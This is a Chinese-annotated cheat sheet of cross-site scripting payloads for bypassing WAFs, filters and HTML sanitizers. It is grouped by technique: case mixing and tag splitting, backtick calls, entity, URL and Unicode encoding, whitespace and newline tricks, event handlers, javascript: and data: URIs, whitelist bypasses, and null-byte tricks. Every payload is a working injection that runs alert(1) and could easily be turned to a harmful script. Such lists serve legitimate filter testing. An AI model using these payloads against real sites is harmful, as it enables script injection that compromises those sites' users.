
注：用于测试 WAF / 过滤器 / sanitizer 绕过

## 大小写与标签拆分

```
<ScRiPt>alert(1)</ScRiPt>
<sCrIpT>alert(1)</sCrIpT>
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr<!---->ipt>alert(1)</scr<!---->ipt>
<<script>alert(1)//<</script>
<script>alert(1)<!/script>
```

## 无括号 / 反引号执行

```
<svg onload=alert`1`>
<img src=x onerror=alert`1`>
<script>alert`1`</script>
<img src=x onerror=alert&lpar;1&rpar;>
<svg onload=alert&lpar;1&rpar;>
```

## HTML 实体编码

```
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
<script>&#97;&#108;&#101;&#114;&#116;(1)</script>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>
```

## URL 编码

```
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src=x%20onerror=alert(1)%3E
javascript%3Aalert(1)
```

## Unicode / 宽字符

```
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
<script>\u0061lert(1)</script>
<img src=x onerror=\u0061lert(1)>
```

## 空白符与换行绕过

```
<img	src=x	onerror=alert(1)>
<img
src=x
onerror=alert(1)>
<svg/
onload=alert(1)>
```

## 事件处理器变体

```
<img src=x onerror=alert(1)>
<img src=x onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
<keygen onfocus=alert(1) autofocus>
```

## 伪协议与 data URI

```
<a href="javascript:alert(1)">x</a>
<a href="JaVaScRiPt:alert(1)">x</a>
<a href="  javascript:alert(1)">x</a>
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

## 标签白名单绕过（常见 sanitizer）

```
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width=100 height=100/></a></svg>
<table background="javascript:alert(1)">
<style>@import'javascript:alert(1)';</style>
<link rel=import href="data:text/html,<script>alert(1)</script>">
```

## 注释与 null 字节（老旧解析器）

```
<!--><script>alert(1)</script>-->
<script><!--
alert(1)//--></script>
<img src=x%00 onerror=alert(1)>
```
